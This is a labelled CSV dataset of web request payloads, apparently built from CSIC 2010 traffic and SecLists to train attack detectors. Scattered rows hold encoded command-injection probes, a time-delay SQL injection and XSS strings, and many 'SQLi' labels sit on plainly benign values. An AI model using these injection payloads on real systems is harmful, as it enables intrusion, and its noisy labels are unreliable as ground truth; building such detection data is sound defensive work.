payload,label,source
8EEA34F8B5CD344081CDCE7E2DE5FD7B,Normal,csic_gsi:cisc_normalTraffic_test.txt
66A69B60069FE474914D149BF3877642,Normal,csic_gsi:cisc_normalTraffic_train.txt
1F4E53C6B103B91893C4E8CB4DCA6D14,Normal,csic_gsi:cisc_normalTraffic_train.txt
4FF3EB05CCBDC48722BD39A50A45CEA9,Normal,csic_gsi:cisc_normalTraffic_test.txt
Aniceto+Lacunza,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
litiGaR,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
34788445W,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%3B%20str%3D%24%28echo%20OIPHJR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2526,CMD,seclists_cmd
!laureando,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%20echo%20APYFLP$((24%2B89))$(echo%20APYFLP)APYFLP%2F%2F,CMD,seclists_cmd
03720,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=lac&pwd=pin90&remember=off&B1=Entrar%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Andenes,+13+6D",Normal,csic_gsi:cisc_normalTraffic_test.txt
9F404D9A71039315500D6F3C028D7C2F,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=7569&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_test.txt
38E87EE38AD1F4DBC0D7AB93CD14754B,Normal,csic_gsi:cisc_normalTraffic_train.txt
Bonitto+Ciraco,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20FAPCEG%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C,CMD,seclists_cmd
BD6C9AC3152329532BAFA6450728192E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
9AF3C9E1482ACFC21B86A101F3FBD0C1,Normal,csic_gsi:cisc_normalTraffic_train.txt
51143B061C2FD055463084C4E6E9C07D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%3Becho$IFSGCRBKK$((37%2B88))$(echo$IFSGCRBKK)GCRBKK\,CMD,seclists_cmd
frueh_eden@showcarsmadrid.pt,Normal,csic_gsi:cisc_normalTraffic_test.txt
hull.jamin@chicasdiabolo.km,Normal,csic_gsi:cisc_normalTraffic_test.txt
4D4CD5102CA18532C56A53CED77D562D,Normal,csic_gsi:cisc_normalTraffic_train.txt
modoA=entrar&login=meridith&pwd=oidorA&remember=on&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
38AC9244FE39FD72F5ACB70A4AA2996E,Normal,csic_gsi:cisc_normalTraffic_train.txt
655ED154A4A68060CDA8D085D2046DC3,Normal,csic_gsi:cisc_normalTraffic_test.txt
modoA=insertar&precio=9168&B1=Confirmar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=quint&password=D1Si0u544a&nombre=Abdala&apellidos=Puigveh�+Morande&email=fitzmahony-mcgraw@fotoseroticas.com.hk&dni=92439025R&direccion=Talavera+56,+&ciudad=Pineda+de+la+Sierra&cp=28189&provincia=�lava&ntc=0562626230095582&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
6BA62669C6DAD8A0A3BF1764157478F4,Normal,csic_gsi:cisc_normalTraffic_train.txt
D8B1D5CE88EED3D5DAABE62B54226197,Normal,csic_gsi:cisc_normalTraffic_train.txt
AAECBBAE334DB6B954711D984B99985B,Normal,csic_gsi:cisc_normalTraffic_test.txt
E99B9DE1C7E40946E764360A18AAC7DD,Normal,csic_gsi:cisc_normalTraffic_train.txt
17001,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C/+Virgen+De+La+Paloma+31+12?H,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D6E19A68D020D776DCFA9140121EC30B,Normal,csic_gsi:cisc_normalTraffic_train.txt
C482B934B3323E13524FA243B53C3468,Normal,csic_gsi:cisc_normalTraffic_train.txt
4357296511696C60329A385992DCCA30,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
fiLosOFAR,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%3Becho$IFSMLEFQQ$((44%2B34))$(echo$IFSMLEFQQ)MLEFQQ%5C%5C,CMD,seclists_cmd
9232D0D3A26B19387743B67463FEAB5F,Normal,csic_gsi:cisc_normalTraffic_test.txt
675380C9A97ED77541D248B85D0BD640,Normal,csic_gsi:cisc_normalTraffic_train.txt
A76839D19FD92A883FB2C18DF8578A75,Normal,csic_gsi:cisc_normalTraffic_test.txt
79B7354B48917040D29395DCEE04FD02,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527%3B%20str%3D%24%28echo%20DJSHTX%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%252F%252F,CMD,seclists_cmd
30189,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0aecho%20ANSTBN$((20%2B35))$(echo%20ANSTBN)ANSTBN%5C%5C,CMD,seclists_cmd
modo=insertar&precio=1647&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_train.txt
8F89FE31320878EC12548F33A7A2D453,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20BFMCIE%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,CMD,seclists_cmd
3E26E2833745255F717C1F02111C623B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20IXZJDX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,seclists_cmd
DFBE6B981BF8B068E64FB461FF7CDF57,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
pacheco_cox4@frenchpolynesia.com.ru,Normal,csic_gsi:cisc_normalTraffic_train.txt
annibale9,Normal,csic_gsi:cisc_normalTraffic_test.txt
1294969325590040,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E5C8A4253491F522C2F3B9FD405B1B53,Normal,csic_gsi:cisc_normalTraffic_train.txt
malHeCHo,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
|echo$IFSRRFVYH$((99%2B28))$(echo$IFSRRFVYH)RRFVYH%27,CMD,seclists_cmd
Wenceslada,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5ud7torio,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20JGUTOJ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%26,CMD,seclists_cmd
"modo=registro&login=stasaski&password=Ac1p55C6�8&nombre=Nadine&apellidos=Aramburo+Gasch&email=hull.jamin@chicasdiabolo.km&dni=58340170A&direccion=C/+Embalse+De+Valdeca�as,+183,+&ciudad=Calera+de+Le�n&cp=03151&provincia=Burgos&ntc=8993369761745604&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
13450,Normal,csic_gsi:cisc_normalTraffic_test.txt
Sopeira,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%26echo%20HOPIIN$((13%2B15))$(echo%20HOPIIN)HOPIIN%27,CMD,seclists_cmd
9C6756E2AF0D14CFD394725A932D7CB1,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
583no,Normal,csic_gsi:cisc_normalTraffic_train.txt
25A62EB062C57DAEDB7EC0D258E5901E,Normal,csic_gsi:cisc_normalTraffic_test.txt
EA99BF5E80328CEFF99D96B9DC683712,Normal,csic_gsi:cisc_normalTraffic_test.txt
3E558DCE7BED97EC7C937D57ED121135,Normal,csic_gsi:cisc_normalTraffic_test.txt
6C3847741C94654CC9E045BB30624E23,Normal,csic_gsi:cisc_normalTraffic_test.txt
B7435339F5CFB7FF3D943A4DF0F387DF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
18EB2813950CC1DD167B5D5959584579,Normal,csic_gsi:cisc_normalTraffic_test.txt
1A0544DBB9BB7EF53C55221A8B7B67C7,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
septic�mica,Normal,csic_gsi:cisc_normalTraffic_test.txt
0548058E054983E052542D81FFCE146C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
21096784B,Normal,csic_gsi:cisc_normalTraffic_train.txt
7B2BB1CEB0724FB3AEE3843E0732EAE2,Normal,csic_gsi:cisc_normalTraffic_train.txt
E368C83B285E7FBC174B7CA055F76B0D,Normal,csic_gsi:cisc_normalTraffic_test.txt
DF95EFE7ED4E2BE5C53B060A741606AE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
viki,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=szura&password=M_iNistRO&nombre=Pancho&apellidos=Pontifes&email=nazmi_reusse@yiutuve.ge&dni=07187438F&direccion=Isla+De+Alboran,+127,+10-B&ciudad=Hoz+y+Costean&cp=45460&provincia=Baleares+(Illes)&ntc=8797006669570441&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
"C/+Pescadores+De+Terranova,+108,+9-E",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Orteu,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8E72D2DD19A30C73B568ACFB085028E4,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=aube&password=coho5b617&nombre=Manel&apellidos=Feixa+Urgell&email=jarett@salsaspain.eg&dni=07434331H&direccion=Berrocala,+151,+&ciudad=Renedo+de+Esgueva&cp=16760&provincia=Zamora&ntc=8543941291101641&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
9B97B438BC70FE541FA5E79CF5C730D2,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=4831&B1=Confirmar?,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
15984899Z,Normal,csic_gsi:cisc_normalTraffic_train.txt
74405E1FEE917BD6F2EA56AEAD988131,Normal,csic_gsi:cisc_normalTraffic_test.txt
15ED95C67C58F969E2F5B0BFAADBCCA5,Normal,csic_gsi:cisc_normalTraffic_test.txt
673A222EDD351EA0CDC4B4EA62AD4088,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20XDAIBC%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C,CMD,seclists_cmd
kroon-shu@vitalhome.ge,Normal,csic_gsi:cisc_normalTraffic_test.txt
43BE757DC243529092EB72E4E02AB3A2,Normal,csic_gsi:cisc_normalTraffic_train.txt
5DA07378CC1F967D5D5759B531A8BF51,Normal,csic_gsi:cisc_normalTraffic_test.txt
5B7F6C489E9EF1193D2E7FD94DDBB990,Normal,csic_gsi:cisc_normalTraffic_train.txt
procacci,Normal,csic_gsi:cisc_normalTraffic_train.txt
02290,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4CE1AA392278FE058EBEE2D3B2D93250,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
08696paros%22%20style=%22background:url(javascript:alert('Paros')),XSS,csic_gsi:cisc_anomalousTraffic_test.txt
6E00C503B67F0D2D2193FC2996C7AE62,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=4320&B1A=Pasar+por+caja,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D2D113EB5E2661C6489CCEE479D3A24B,Normal,csic_gsi:cisc_normalTraffic_test.txt
BF937C19562BEBD1BC4AE0AEE35032B8,Normal,csic_gsi:cisc_normalTraffic_train.txt
DBABCDCAF91F0C5DAF6BFE9BE85DBE9B,Normal,csic_gsi:cisc_normalTraffic_train.txt
ECC5ECC428A65F56A01BB4FFE021B068,Normal,csic_gsi:cisc_normalTraffic_test.txt
C230F3C1AF21A1EA99E694AC9DB3ECDB,Normal,csic_gsi:cisc_normalTraffic_train.txt
39A03662162C3B120C2162D15FEA6DEB,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20GFPZMF%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20//,CMD,seclists_cmd
Mae,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20XBWWVF%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,CMD,seclists_cmd
id=3&nombre=Queso+Manchego&precio=100&cantidad=57&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
0722C32449963F2FF54B94CDEC694269,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20TSXSCX%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,CMD,seclists_cmd
Hop-man-s,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3C11ECB32857A49A847DA60C38DC54E6,Normal,csic_gsi:cisc_normalTraffic_test.txt
';echo%20PWKXHB$((27%2B16))$(echo%20PWKXHB)PWKXHB,CMD,seclists_cmd
%2522%7C%20%5B%206%20-ne%20%24%28echo%20BILMTI%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F,CMD,seclists_cmd
Haiti+27+1?G,Normal,csic_gsi:cisc_normalTraffic_train.txt
Zaima,Normal,csic_gsi:cisc_normalTraffic_test.txt
6C6A77A0F2962CF76B3959F89FCD4342,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1&nombre=Vino+Rioja&precio=39&cantidad=63&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
B11CD374ED1CD49B19B022A1E1A3BAB4,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20WAJEOU%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%23,CMD,seclists_cmd
Efr�n,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20VHBJGH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,CMD,seclists_cmd
5589E15942DE984BFAC8151F1EFCFCB7,Normal,csic_gsi:cisc_normalTraffic_test.txt
Armu�a+de+Almanzora,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
487CD13DB36660A574A4D16ED2101E82,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%26echo%20BAHZUB$((39%2B52))$(echo%20BAHZUB)BAHZUB%5C%5C,CMD,seclists_cmd
8E422132DA62E465DD70C16D1062420F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3356E496E6031B15A7B4200285F07CAD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
ins33l0c205,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Calle+Falconera,+173+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
11CCDBD6740504618CC42FD2B53ECC5A,Normal,csic_gsi:cisc_normalTraffic_test.txt
33299A68150908CD96E086DF10A8BFEF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7Cecho%20PUCKTG$((40%2B18))$(echo%20PUCKTG)PUCKTG%22,CMD,seclists_cmd
7642131917731646,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
73451819F02A3DED6294C93098EFDBC4,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar%20&precio=30&B1=Confirmar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
12254191D55B8F005934B63A8DA66217,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B34D56A2D30F1721AE136E6309762DD2,Normal,csic_gsi:cisc_normalTraffic_train.txt
EEC33A6ABB95BE86FE68BA51D3C007B5,Normal,csic_gsi:cisc_normalTraffic_train.txt
59ABF5A315327091671A154F8CD8EB0B,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=1517&B1A=Confirmar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
""".print(`echo%20RZWFMA`.`echo%20$((75%2B86))`.`echo%20RZWFMA`.`echo%20RZWFMA`)%3B%5C%5CRZWFMA",CMD,seclists_cmd
631405DA9C3A4727AA1697DE99C7E01B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"""%26%26echo$IFSEOCQFN$((57%2B12))$(echo$IFSEOCQFN)EOCQFN%2F%2F",CMD,seclists_cmd
9CEC0B8E9CF1F0C2C7FDF18F86C2FF35,Normal,csic_gsi:cisc_normalTraffic_train.txt
Santa+Coloma+de+Cervell�,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
EE95CE4509246FC4F11CEB2FFDB4277C,SQLi,community:payloads_seed
%26echo$IFSVUHFEV$((97%2B15))$(echo$IFSVUHFEV)VUHFEV%2F%2F,CMD,seclists_cmd
Gali,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D92664498F0EE13F629BB25BFCD7CB17,Normal,csic_gsi:cisc_normalTraffic_test.txt
exorabl$e,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%7C%20%5B%202%20-ne%20%24%28echo%20XWWMIW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23,CMD,seclists_cmd
"Foix+147,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
AC431EB3AC57A5AE37AB3B880A1811BD,Normal,csic_gsi:cisc_normalTraffic_train.txt
Guiliano,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%3Becho%20GCPNLC$((57%2B96))$(echo%20GCPNLC)GCPNLC,CMD,seclists_cmd
B340F4C3D34616F8FD598CBF4C0B9B16,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Calle+Belateko+Monasterioaren,+192,+2?E",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
32A0A3A6374AC7CD79CB4F53F5D0AB1F,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0aecho%20XKMVBL$((16%2B26))$(echo%20XKMVBL)XKMVBL,CMD,seclists_cmd
035D1502CC5E0713E00D681C2C6E2DDF,Normal,csic_gsi:cisc_normalTraffic_train.txt
caria,Normal,csic_gsi:cisc_normalTraffic_test.txt
frankos,Normal,csic_gsi:cisc_normalTraffic_train.txt
370415E7A929B0933523F4646E191083,Normal,csic_gsi:cisc_normalTraffic_test.txt
A7C6F62DB60CE7516A10713779727B08,Normal,csic_gsi:cisc_normalTraffic_test.txt
0er_rug�neo,Normal,csic_gsi:cisc_normalTraffic_train.txt
A1F519789049EFB3E3E7DE1B94021A9F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
&echo%20JBPWLJ$((57%2B13))$(echo%20JBPWLJ)JBPWLJ%2F%2F,CMD,seclists_cmd
22487,Normal,csic_gsi:cisc_normalTraffic_train.txt
DDC524D91F9F2CEC3351853C4F0A2023,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
291,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
AACD3D4CFDDAE5F9072FA9E44E2196F2,Normal,csic_gsi:cisc_normalTraffic_train.txt
patchsqa,Normal,csic_gsi:cisc_normalTraffic_train.txt
";echo$IFSWYKTNX$((57%2B37))$(echo$IFSWYKTNX)WYKTNX""",CMD,seclists_cmd
9194826CF203F85CC603F543D1DB7B68,Normal,csic_gsi:cisc_normalTraffic_train.txt
EA93E8EF35A8D266200BBFB309422592,Normal,csic_gsi:cisc_normalTraffic_test.txt
rolfing@juanpolo.uy,Normal,csic_gsi:cisc_normalTraffic_test.txt
3A825586C68F1BAF686AA8E558B08CD7,Normal,csic_gsi:cisc_normalTraffic_train.txt
wai,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
EAB98FF12E9CB694E64AADA50B650171,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
echo%20NTKKKZ$((98%2B48))$(echo%20NTKKKZ)NTKKKZ&,CMD,seclists_cmd
7EB829ABB9BE732B4DF96BF338B54E6E,Normal,csic_gsi:cisc_normalTraffic_test.txt
51407BA58EFE8B47B61047315E8C1061,Normal,csic_gsi:cisc_normalTraffic_train.txt
ennoblecedora,Normal,csic_gsi:cisc_normalTraffic_test.txt
0824507714934281,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%204%20-ne%20%24%28echo%20JXWDPO%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20,CMD,seclists_cmd
5C5DF61F7A52BFD038AF144C42C528E8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D87E3E7650616352818167D6E11965F0,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%7C%20%5B%204%20-ne%20%24%28echo%20HYWCTJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//,CMD,seclists_cmd
19DE949DAFA5C6DA084196F9357BE0A6,Normal,csic_gsi:cisc_normalTraffic_train.txt
FDA55CAF833A15DC8DE2510BC7F6308C,Normal,csic_gsi:cisc_normalTraffic_train.txt
E9C9BC150475263C64E9119C2A386D76,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
vine-clunes@cor-jet.eh,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=mozes&pwd=apAsioNAdaMENte&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=ailee1&pwd=tableo&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
2FE827714A6E8E4D5E5B085E35291E1E,Normal,csic_gsi:cisc_normalTraffic_train.txt
82A051413980873BFC617D3C60EFC294,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=asistore&password=vicegere!nte&nombre=Ulises&apellidos=Vertizblanco&email=santess@rtce.mo&dni=96398598D&direccion=Plaza+Plazuela+S/N,+&ciudad=Milagros&cp=05151&provincia=�vila&ntc=0118236388310802&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%0A%20str%3D%24%28echo%20DAECDG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,seclists_cmd
46C82D58F9AB7EB6B52F9BD293752771,Normal,csic_gsi:cisc_normalTraffic_test.txt
2AFA81849DACC8AB753416D51067EA35,Normal,csic_gsi:cisc_normalTraffic_test.txt
CD4B2A7F9690654518A18F29E7CF61ED,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=entrar&login=timm&pwd=eMpeInE&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
ABFA7D4641421442503DA53087E63854,Normal,csic_gsi:cisc_normalTraffic_train.txt
twohill_richards@benadressa.vu,Normal,csic_gsi:cisc_normalTraffic_test.txt
A815EBCDD691239B51BF5660F7D12E29,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8C562FA3179F3446A452BEBE9AA64190,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6F9DCDA785A8629562181E850C89EB3E,Normal,csic_gsi:cisc_normalTraffic_test.txt
571C049C4FA83BA63E9064B2E32BA015,Normal,csic_gsi:cisc_normalTraffic_train.txt
CB2BE19D714C69F24138643364945425,Normal,csic_gsi:cisc_normalTraffic_test.txt
B8A558AE2ABCAED4AFFE9978DB12D4FC,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
print(`echo%20LPXWJK;echo%20$((35%2B1));echo%20LPXWJK;echo%20LPXWJK`)%3B//LPXWJK,CMD,seclists_cmd
4A590919BA57D0C20157E6300D03D2C3,Normal,csic_gsi:cisc_normalTraffic_train.txt
DB4A60499BB2A90BF700624F6728C49C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
41FE63B7E404582AE3A90667ABCAC597,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Calle+Camino+Getafe,+157,+",Normal,csic_gsi:cisc_normalTraffic_train.txt
ulano,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=nall&password=ma/nd'ilejo&nombre=Leide&apellidos=Balaguer+Morelos&email=teixera@maquillajeparalabios.td&dni=35108015X&direccion=C/+Angel+Marsa+i+Beca+159,+6-D&ciudad=Calaf&cp=36543&provincia=Cantabria&ntc=7238071991283064&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4FA7937E9096917A29469AB105AAC36D,Normal,csic_gsi:cisc_normalTraffic_test.txt
8470,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=3228&B1=Pasar+por+caja/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Confirmar','0','0','0','0');waitfor+delay+'0:0:15';--",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
penningt,Normal,csic_gsi:cisc_normalTraffic_train.txt
perepeczko@zarasalud.rw,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
ricci@redhost.is,Normal,csic_gsi:cisc_normalTraffic_train.txt
14131F24DA68822EE91E402ABD6BCDBD,Normal,csic_gsi:cisc_normalTraffic_test.txt
D04EE8E2C9B2516689EFD89CF23583CE,Normal,csic_gsi:cisc_normalTraffic_train.txt
"%26%26echo%20QCERHI$((79%2B52))$(echo%20QCERHI)QCERHI""",CMD,seclists_cmd
CCA6F94FC9A251CC87A70DA974FC36D0,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
580D912452D2C6FA81C58D11FEC6F635,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=entrar&login=mohamed&pwd=fiLosOFAR&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
43F0E3859FC9F79181ECDCDFA6330B0E,Normal,csic_gsi:cisc_normalTraffic_test.txt
B76C07438205E9F73573E8F28E2C08A3,Normal,csic_gsi:cisc_normalTraffic_train.txt
05690,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%7C%20%5B%208%20-ne%20%24%28echo%20JYVQFK%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,CMD,seclists_cmd
kanwe@tresbrujas.al,Normal,csic_gsi:cisc_normalTraffic_test.txt
364B62B20BC85927EB22465DB5BE12E5,Normal,csic_gsi:cisc_normalTraffic_train.txt
86CE4CEF4A900B1A3CBAB4A435938729,Normal,csic_gsi:cisc_normalTraffic_train.txt
